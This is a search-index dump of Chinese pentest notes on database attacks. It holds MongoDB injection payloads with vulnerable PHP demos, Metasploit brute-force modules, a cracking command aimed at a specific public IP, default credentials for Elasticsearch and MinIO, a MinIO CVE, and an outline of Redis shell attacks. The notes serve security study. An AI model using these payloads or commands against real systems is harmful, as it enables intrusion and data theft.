\u8fd9\u4e2a\u53c2\u6570\u53d1\u8fc7\u53bb\u540e\uff0c\u591a\u7ef4\u6570\u7ec4\u89e3\u6790\u540e\uff0c\u4ee3\u7801\u5185\u90e8\u5c31\u662f\u8fd9\u4e2a\u60c5\u51b5 $data = array( 'username'=>array('$ne'=>\"xxxx\"), 'password'=>array('$ne'=>\"xxxx\") ); \u6267\u884c\u7684\u6570\u636e\u5e93\u8bed\u53e5\u5c31\u662f db.test.find({username:{'$ne':'xxxx'},password:{'$ne':'xxxx'}}); \u5c31\u662f\u67e5\u8be2test\u96c6\u5408\u4e2d\u7684 username\u4e0d\u4e3axxxx\uff0cpassword\u4e0d\u4e3axxxx\u7684\u7ed3\u679c\u3002\u6362\u800c\u8a00\u4e4b\u5c31\u662f\u67e5\u8be2test\u96c6\u5408\u4e2d\u6240\u6709\u6570\u636e \u76f8\u5f53\u4e8emysql\uff1aselect * from test where username!='test' and password!='test'; \u76f2\u6ce8\uff1a\u5229\u7528\u6b63\u5219 #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $coll = $db->test; //\u9009\u62e9\u96c6\u5408 $lock = $_POST['lock']; $key = $_POST['key']; if (is_array($lock)) { $data = array( 'lock'=>$lock); $data = $coll->find($data); if ($data->count()>0) { echo 'the lock is right,but wrong key'; }else{ echo 'lock is wrong'; } }else{ if ($lock == 'aabbccdd'&&$key=='aabbccdd') { echo 'Your flag is xxxxxxx'; }else{ echo 'lock is wrong'; } } ?> payload key=1&lock[$regex]=^a key=1&lock[$regex]=^b key=1&lock[$regex]=^c ..... \u76f8\u5f53\u4e8e\uff1a db.test.find({lock:{'$regex':'^a'}}); db.test.find({lock:{'$regex':'^b'}}); db.test.find({lock:{'$regex':'^c'}}); db.test.find({lock:{'$regex':'^ca'}}); \u2026\u2026 \u2026\u2026 db.test.find({lock:{'$regex':'^aabbccdd'}});","title":"MongoDB\u51fd\u6570\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#_6","text":"#!php <?php $username = $_GET['username']; $password = $_GET['password']; $query = \"var data = db.test.findOne({username:'$username',password:'$password'});return data;\"; //$query = \"return db.test.findOne();\"; //echo $query; $mongo = new mongoclient(); $db = $mongo->myinfo; $data = $db->execute($query); if ($data['ok'] == 1) { if ($data['retval']!=NULL) { echo 'username:'.$data['retval']['username'].\"</br>\"; echo 'password:'.$data['retval']['password'].\"</br>\"; }else{ echo '\u672a\u627e\u5230'; } }else{ echo $data['errmsg']; } ?> \u672c\u8d28\u4e0a\u653b\u51fb\u624b\u6cd5\u8fd8\u662f\u5b57\u7b26\u62fc\u63a5\u7136\u540e\u52a0\u6ce8\u91ca\u7b26 http://127.0.0.1/1.php?username=test '});return {username:tojson(db.getCollectionNames()),password:2};//\\&password=test \u9ad8\u7248\u672c\u597d\u50cf\u4e0d\u80fd\u52a0\u6ce8\u91ca\u7b26\u4e86\uff0c\u90a3\u5c31\u4f7f\u7528\u95ed\u5408\u7684\u65b9\u6cd5\u5373\u53ef\u3002 \u8fd9\u4e2apayload\u662f\u76f2\u6ce8 http://127.0.0.1/1.php?username=test '});if (db.version() > \"0\") { sleep(10000); exit; }var b=({a:'1\\&password=test where\u6ce8\u5165 demo \u5728Mongdb\u4e2d\u53ef\u4ee5\u4f7f\u7528\\$where\u64cd\u4f5c\u7b26,\u76f8\u5f53\u4e8esql\u8bed\u53e5\u4e2d\u7684where\u9650\u5236\u8bed\u53e5,mongodb\u4e2d\u7684\\$where\u64cd\u4f5c\u7b26\u5e38\u5e38\u5f15\u5165\u4e00\u4e2ajs\u7684\u51fd\u6570\u6765\u4f5c\u4e3a\u9650\u5236\u6761\u4ef6\uff0c\u5f53js\u51fd\u6570\u4e2d\u7684\u5b57\u7b26\u4e32\u5b58\u5728\u672a\u8fc7\u6ee4\u7684\u7528\u6237\u8f93\u5165\u65f6\uff0c\u6ce8\u5165\u5c31\u4ea7\u751f\u4e86\u3002 #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $coll = $db->news; //\u9009\u62e9\u96c6\u5408 $news = $_GET['news']; $function = \"function() {if(this.news == '$news') return true}\"; echo $function; $result = $coll->find(array('$where'=>$function)); if ($result->count()>0) { echo '\u8be5\u65b0\u95fb\u5b58\u5728'; }else{ echo '\u8be5\u65b0\u95fb\u4e0d\u5b58\u5728'; } ?> \u672c\u8d28\u4e0a\u5c31\u76f8\u5f53\u4e8e select * from news where news='\\$news'\uff0c\u90a3\u5c31\u5b57\u7b26\u4e32\u62fc\u63a5\u5c31\u884c\u4e86\uff0c\u548cmysql\u6ce8\u5165\u5dee\u4e0d\u591a \u76f2\u6ce8payload http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames().length>0%26%26'1'=='1 http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames()[0][0]=='m'%26%26'1'=='1 http://127.0.0.1/3.php?news=test'%26%26tojson(db.user.find()[0])[0]==' {'%26%26'1'=='1 \u56e0\u4e3adb.user.find()\u8fd4\u56de\u7684\u4e0d\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u65e0\u6cd5\u53d6\u51fa\u5b57\u7b26\u8fdb\u884c\u6bd4\u8f83\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u8f6c\u5316\u6210\u4e00\u4e2ajson\u5b57\u7b26\u4e32\uff0c\u5c31\u53ef\u4ee5\u6bd4\u8f83\u4e86\u3002 \u9053\u7406\u8bb2\u660e\u767d\u4e86\uff0c\u5269\u4e0b\u7684\u90fd\u662f\u4f53\u529b\u6d3b\uff0c\u7528python\u6216\u8005php\u5199\u4e0b\u5c0f\u811a\u672c\u5c31\u80fd\u5b9e\u73b0\u81ea\u52a8\u5316\u3002","title":"\u5b57\u7b26\u4e32\u62fc\u63a5"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#ref","text":"https://wooyun.js.org/drops/Mongodb\u6ce8\u5165\u653b\u51fb.html","title":"ref"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/","text":"Mongodb \u76ee\u5f55 \u76f8\u5173\u5de5\u5177 GUI \u6e17\u900f \u672a\u6388\u6743\u68c0\u6d4b \u7206\u7834 msf zpscan fscan \u9ed8\u8ba4\u7aef\u53e327017 \u76f8\u5173\u5de5\u5177 GUI \u63a8\u8350\u4f7f\u7528\u5b98\u65b9\u7684Mongodb Compass \u6e17\u900f \u672a\u6388\u6743\u68c0\u6d4b use auxiliary/scanner/mongodb/mongodb_login set rhosts 192.168.90.0/24 set threads 10 exploit \u7206\u7834 msf use exploit/linux/misc/mongod_native_helper set password 123456 set username test set rhosts 192.168.253.70 zpscan /zpscan_darwin crack -i \"39.105.195.122:3718|mongodb\" \u4f46\u662f\u672a\u6388\u6743\u7684\u65f6\u5019\uff0c\u4f1a\u5f39\u5bc6\u7801\u662fadmin:admin\uff0c\u5f97\u591a\u591a\u9a8c\u8bc1\u4e00\u4e0b fscan","title":"Mongodb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#mongodb","text":"","title":"Mongodb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#_1","text":"\u76f8\u5173\u5de5\u5177 GUI \u6e17\u900f \u672a\u6388\u6743\u68c0\u6d4b \u7206\u7834 msf zpscan fscan \u9ed8\u8ba4\u7aef\u53e327017","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#_2","text":"","title":"\u76f8\u5173\u5de5\u5177"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#gui","text":"\u63a8\u8350\u4f7f\u7528\u5b98\u65b9\u7684Mongodb Compass","title":"GUI"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#_3","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#_4","text":"use auxiliary/scanner/mongodb/mongodb_login set rhosts 192.168.90.0/24 set threads 10 exploit","title":"\u672a\u6388\u6743\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#_5","text":"","title":"\u7206\u7834"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#msf","text":"use exploit/linux/misc/mongod_native_helper set password 123456 set username test set rhosts 192.168.253.70","title":"msf"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#zpscan","text":"/zpscan_darwin crack -i \"39.105.195.122:3718|mongodb\" \u4f46\u662f\u672a\u6388\u6743\u7684\u65f6\u5019\uff0c\u4f1a\u5f39\u5bc6\u7801\u662fadmin:admin\uff0c\u5f97\u591a\u591a\u9a8c\u8bc1\u4e00\u4e0b","title":"zpscan"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Mongodb/Mongodb/#fscan","text":"","title":"fscan"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/doris/doris/","text":"doris \u76ee\u5f55 \u672a\u6388\u6743 Apache Doris\uff08\u539f\u540dPalo\uff09\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0fSQL\u6570\u636e\u4ed3\u5e93 \u672a\u6388\u6743 8060 \u6570\u636e\u5e93\u8fde\u63a5\u6c60 8040 \u6027\u80fd\u6570\u636e\u76d1\u63a7 8020 sourcemap","title":"doris"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/doris/doris/#doris","text":"","title":"doris"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/doris/doris/#_1","text":"\u672a\u6388\u6743 Apache Doris\uff08\u539f\u540dPalo\uff09\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5206\u5e03\u5f0fSQL\u6570\u636e\u4ed3\u5e93","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/doris/doris/#_2","text":"8060 \u6570\u636e\u5e93\u8fde\u63a5\u6c60 8040 \u6027\u80fd\u6570\u636e\u76d1\u63a7 8020 sourcemap","title":"\u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/","text":"elastic search \u76ee\u5f55 \u63a2\u6d4b \u9ed8\u8ba4\u7aef\u53e3 \u7248\u672c \u6e17\u900f \u672a\u6388\u6743 \u9ed8\u8ba4\u7528\u6237\u4e0e\u53e3\u4ee4 \u540e\u6e17\u900f \u67e5\u8be2\u6709\u7528\u7684\u6570\u636e dump\u6570\u636e \u6570\u636e\u5e93+\u5feb\u901f\u6570\u636e\u641c\u7d22\u5f15\u64ce \u63a2\u6d4b \u9ed8\u8ba4\u7aef\u53e3 9200 \u7248\u672c \u672a\u6388\u6743\u6216\u767b\u5f55\u540e\uff0c\u76f4\u63a5\u8bbf\u95ee\u9996\u9875 \u6e17\u900f \u672a\u6388\u6743 HTTP\u534f\u8bae\u8bbf\u95ee\u9ed8\u8ba4\u7aef\u53e3\u7aef\u53e3 9200 \u8fd4\u56de\u5185\u5bb9\u4e2d\u5305\u542b\u201dYou Know, for Search\u201d\uff0c\u5219\u6709\u672a\u6388\u6743 \u9ed8\u8ba4\u7528\u6237\u4e0e\u53e3\u4ee4 elastic\uff08\u8fd9\u662f\u8d85\u7ea7\u7528\u6237\uff01Elasticsearch\u7684\u65e7\u7248\u672c\u5177\u6709\u8be5\u7528\u6237\u7684\u9ed8\u8ba4\u5bc6\u7801changeme\uff09 logstash_system kibana_system apm_system beats_system remote_monitoring_user \u540e\u6e17\u900f \u67e5\u8be2\u6709\u7528\u7684\u6570\u636e curl 'localhost:9200/_cat/indices?v #\u5217\u51fa\u6240\u6709\u7d22\u5f15 curl 'localhost:9200/_plugin/head/ #ES\u7684head\u63d2\u4ef6\uff0c\u53ef\u4ee5\u5bf9es\u6570\u636e\u5e93\u8fdb\u884c\u5404\u79cd\u8bbe\u7f6e\u548c\u6570\u636e\u68c0\u7d22\u529f\u80fd\u7684 \u7ba1\u7406\u63d2\u4ef6 curl 'localhost:9200/_cat/nodes?v #\u53ef\u4ee5\u83b7\u53d6\u96c6\u7fa4\u7684\u8282\u70b9\u5217\u8868 curl 'localhost:9200/_nodes?prettify #\u8282\u70b9\u8bbe\u7f6e curl 'localhost:9200/_status #\u67e5\u770b\u72b6\u6001 curl 'localhost:9200/_search?pretty #\u67e5\u8be2\u6240\u6709\u7d22\u5f15 \u9ed8\u8ba4\u524d10\u6761 curl 'localhost:9200/zjftu/_search?pretty #\u67e5\u8be2\u67d0\u4e00\u4e2a\u7d22\u5f15 \u67e5\u8be2\uff0c\u8bbe\u7f6e\u67e5\u8be2\u6761\u6570 POST {\"query\": { \"match_all\": {} },\"from\":0,\"size\": 100} dump\u6570\u636e es2csv >From source: $ pip install git+https://github.com/taraslayshchuk/es2csv.git >From pip: $ pip install es2csv","title":"elastic search"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#elastic-search","text":"","title":"elastic search"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_1","text":"\u63a2\u6d4b \u9ed8\u8ba4\u7aef\u53e3 \u7248\u672c \u6e17\u900f \u672a\u6388\u6743 \u9ed8\u8ba4\u7528\u6237\u4e0e\u53e3\u4ee4 \u540e\u6e17\u900f \u67e5\u8be2\u6709\u7528\u7684\u6570\u636e dump\u6570\u636e \u6570\u636e\u5e93+\u5feb\u901f\u6570\u636e\u641c\u7d22\u5f15\u64ce","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_2","text":"","title":"\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_3","text":"9200","title":"\u9ed8\u8ba4\u7aef\u53e3"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_4","text":"\u672a\u6388\u6743\u6216\u767b\u5f55\u540e\uff0c\u76f4\u63a5\u8bbf\u95ee\u9996\u9875","title":"\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_5","text":"","title":"\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_6","text":"HTTP\u534f\u8bae\u8bbf\u95ee\u9ed8\u8ba4\u7aef\u53e3\u7aef\u53e3 9200 \u8fd4\u56de\u5185\u5bb9\u4e2d\u5305\u542b\u201dYou Know, for Search\u201d\uff0c\u5219\u6709\u672a\u6388\u6743","title":"\u672a\u6388\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_7","text":"elastic\uff08\u8fd9\u662f\u8d85\u7ea7\u7528\u6237\uff01Elasticsearch\u7684\u65e7\u7248\u672c\u5177\u6709\u8be5\u7528\u6237\u7684\u9ed8\u8ba4\u5bc6\u7801changeme\uff09 logstash_system kibana_system apm_system beats_system remote_monitoring_user","title":"\u9ed8\u8ba4\u7528\u6237\u4e0e\u53e3\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_8","text":"","title":"\u540e\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#_9","text":"curl 'localhost:9200/_cat/indices?v #\u5217\u51fa\u6240\u6709\u7d22\u5f15 curl 'localhost:9200/_plugin/head/ #ES\u7684head\u63d2\u4ef6\uff0c\u53ef\u4ee5\u5bf9es\u6570\u636e\u5e93\u8fdb\u884c\u5404\u79cd\u8bbe\u7f6e\u548c\u6570\u636e\u68c0\u7d22\u529f\u80fd\u7684 \u7ba1\u7406\u63d2\u4ef6 curl 'localhost:9200/_cat/nodes?v #\u53ef\u4ee5\u83b7\u53d6\u96c6\u7fa4\u7684\u8282\u70b9\u5217\u8868 curl 'localhost:9200/_nodes?prettify #\u8282\u70b9\u8bbe\u7f6e curl 'localhost:9200/_status #\u67e5\u770b\u72b6\u6001 curl 'localhost:9200/_search?pretty #\u67e5\u8be2\u6240\u6709\u7d22\u5f15 \u9ed8\u8ba4\u524d10\u6761 curl 'localhost:9200/zjftu/_search?pretty #\u67e5\u8be2\u67d0\u4e00\u4e2a\u7d22\u5f15 \u67e5\u8be2\uff0c\u8bbe\u7f6e\u67e5\u8be2\u6761\u6570 POST {\"query\": { \"match_all\": {} },\"from\":0,\"size\": 100}","title":"\u67e5\u8be2\u6709\u7528\u7684\u6570\u636e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/elastic%20search/elastic%20search/#dump","text":"es2csv >From source: $ pip install git+https://github.com/taraslayshchuk/es2csv.git >From pip: $ pip install es2csv","title":"dump\u6570\u636e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/minio/minio/","text":"minio \u76ee\u5f55 \u524d\u6e17\u900f \u9ed8\u8ba4\u53e3\u4ee4 \u7248\u672c\u63a2\u6d4b CVE-2023-28432 MiniO\u4fe1\u606f\u6cc4\u9732 \u4fe1\u606f\u6cc4\u9732\u63a5rce \u57fa\u4e8eGo\u8bed\u8a00\u53d1\u5f00\u7684\u9ad8\u6027\u80fd\u3001\u5206\u5e03\u5f0f\u7684\u5bf9\u8c61\u5b58\u50a8\u7cfb\u7edf\u3002 \u524d\u6e17\u900f \u9ed8\u8ba4\u53e3\u4ee4 \u9ed8\u8ba4\u7528\u6237\u540d\uff1aminioadmin \u9ed8\u8ba4\u53e3\u4ee4\uff1a minioadmin \u7248\u672c\u63a2\u6d4b f12\u641cversion CVE-2023-28432 MiniO\u4fe1\u606f\u6cc4\u9732 \u5f71\u54cd\u7248\u672c RELEASE.2019-12-17T23-16-33Z <= MinIO < RELEASE.2023-03-20T20-16-18Z /minio/bootstrap/v1/verify post\u8bf7\u6c42\u83b7\u5f97\u654f\u611f\u4fe1\u606f https://github.com/MzzdToT/CVE-2023-28432 \u6279\u91cf\u626b \u4fe1\u606f\u6cc4\u9732\u63a5rce \u628aCVE-2023-28432\u8fd9\u4e2a\u6d1e\u5229\u7528\u8d77\u6765\u53ef\u4ee5\u6253rce https://www.freebuf.com/vuls/363647.html","title":"minio"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/minio/minio/#minio","text":"","title":"minio"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/minio/minio/#_1","text":"\u524d\u6e17\u900f \u9ed8\u8ba4\u53e3\u4ee4 \u7248\u672c\u63a2\u6d4b CVE-2023-28432 MiniO\u4fe1\u606f\u6cc4\u9732 \u4fe1\u606f\u6cc4\u9732\u63a5rce \u57fa\u4e8eGo\u8bed\u8a00\u53d1\u5f00\u7684\u9ad8\u6027\u80fd\u3001\u5206\u5e03\u5f0f\u7684\u5bf9\u8c61\u5b58\u50a8\u7cfb\u7edf\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/minio/minio/#_2","text":"","title":"\u524d\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/minio/minio/#_3","text":"\u9ed8\u8ba4\u7528\u6237\u540d\uff1aminioadmin \u9ed8\u8ba4\u53e3\u4ee4\uff1a minioadmin","title":"\u9ed8\u8ba4\u53e3\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/minio/minio/#_4","text":"f12\u641cversion","title":"\u7248\u672c\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/minio/minio/#cve-2023-28432-minio","text":"\u5f71\u54cd\u7248\u672c RELEASE.2019-12-17T23-16-33Z <= MinIO < RELEASE.2023-03-20T20-16-18Z /minio/bootstrap/v1/verify post\u8bf7\u6c42\u83b7\u5f97\u654f\u611f\u4fe1\u606f https://github.com/MzzdToT/CVE-2023-28432 \u6279\u91cf\u626b","title":"CVE-2023-28432 MiniO\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/minio/minio/#rce","text":"\u628aCVE-2023-28432\u8fd9\u4e2a\u6d1e\u5229\u7528\u8d77\u6765\u53ef\u4ee5\u6253rce https://www.freebuf.com/vuls/363647.html","title":"\u4fe1\u606f\u6cc4\u9732\u63a5rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","text":"redis\u7684\u4e00\u4e9b\u653b\u51fb\u65b9\u5f0f \u76ee\u5f55 RESP\u534f\u8bae gopher\u534f\u8bae \u5982\u4f55redis\u8fdc\u7a0b\u94fe\u63a5 \u653b\u51fb\u65b9\u6cd5\u4e00:\u5199shell \u653b\u51fb\u65b9\u6cd5\u4e8c:info\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u653b\u51fb\u65b9\u6cd5\u4e09\uff1a\u5199\u5165ssh\u516c\u94a5 \u653b\u51fb\u65b9\u6cd5\u56db\uff1a\u5229\u7528cron\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell \u53c2\u8003 https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/ Redis\u9ed8\u8ba4\u7aef\u53e36379 \u5982\u679c\u5b58\u5728\u672a\u6388\u6743\u95ee\u9898\uff0c\u90a3\u4e48\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u5f80\u8fd9\u53f0Redis\u670d\u52a1\u5668\u4e0a\u4f20\u8f93\u547d\u4ee4 \u4e00\u822cRedis\u653b\u51fb\u6709 \u5199shell\uff08\u6700\u5e38\u7528\uff09\uff0c\u5199\u5bc6\u94a5\uff0c\u5199crontab\u53cd\u5f39shell, info\u83b7\u5f97\u654f\u611f\u4fe1\u606f,\u5176\u4e2d\u5199\u5bc6\u94a5\u548c\u5199crontab\u4e0d\u662f\u90a3\u4e48\u7684\u597d\u7528 \u5728\u8bb2\u653b\u51fb\u4e4b\u524d\uff0c\u8981\u8bb2\u4e00\u4e0bRESP\u534f\u8bae RESP\u534f\u8bae Redis\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u901a\u8fc7RESP\u534f\u8bae\u7684\u901a\u4fe1\u3002 resp\u534f\u8bae\u4eceredis1.2\u5f15\u5165\u3002 \u8fd9\u4e2a\u534f\u8bae\u628a\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u4e4b\u95f4\u7684\u6570\u636e\u4ee5\u4e00\u79cd\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5904\u7406\u5e76\u4f20\u8f93 \u5728RESP\u4e2d\uff0c\u67d0\u4e9b\u6570\u636e\u7684\u7c7b\u578b\u53d6\u51b3\u4e8e\u7b2c\u4e00\u4e2a\u5b57\u8282\uff1a \u5bf9\u4e8e Simple Strings \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f + \u5bf9\u4e8e error \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f - \u5bf9\u4e8e Integer \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f : \u5bf9\u4e8e Bulk Strings \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f $ \uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u547d\u4ee4\u5c31\u662f\u653e\u5728\u6570\u7ec4\u4e2d\u7684BulkStrings\u7c7b\u578b \u5bf9\u4e8e array \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f * \u6b64\u5916\uff0c RESP \u80fd\u591f\u4f7f\u7528\u7a0d\u540e\u6307\u5b9a\u7684 Bulk Strings \u6216 Array \u7684\u7279\u6b8a\u53d8\u4f53\u6765\u8868\u793a Null \u503c\u3002 \u5728RESP\u4e2d\uff0c\u534f\u8bae\u7684\u4e0d\u540c\u90e8\u5206\u59cb\u7ec8\u4ee5 \"\\r\\n\"(CRLF) \u7ed3\u675f\u3002 \u540c\u65f6\u6bcf\u4e2a\u7c7b\u578b\u5b57\u8282\u540e\u7d27\u8ddf\u7740\u8be5\u7c7b\u578b\u7684\u957f\u5ea6\uff0c\u7136\u540e\u662fCRLF\uff0c\u7136\u540e\u662f\u8be5\u7c7b\u578b\u7684\u503c \u8bf4\u4e86\u8fd9\u4e48\u591a\uff0c\u80af\u5b9a\u4e0d\u4f1a\u5f88\u61c2\uff0c\u4e0a\u56fe \u5373\u53d1\u9001\u7684\u65f6\u5019\uff0c\u662f\u7528\u4e09\u4e2a\u5143\u7d20\u7684\u6570\u7ec4(*3),\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u4e09\u4e2a\u957f\u5ea6\u7684BulkString($3)\u5176\u503c\u4e3aset,\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f\u56db\u4e2a\u957f\u5ea6\u7684BulkSting($4)\u5176\u503c\u4e3aname,\u7b2c\u4e09\u4e2a\u5143\u7d20\u662f\u56db\u4e2a\u957f\u5ea6\u957f\u7684BulkString(\\$4)\u5176\u503c\u4e3atest,\u670d\u52a1\u5668\u8fd4\u56deSimpleString\uff08+\uff09OK\uff0c\u4ee5\u4e0b\u7c7b\u63a8 gopher\u534f\u8bae 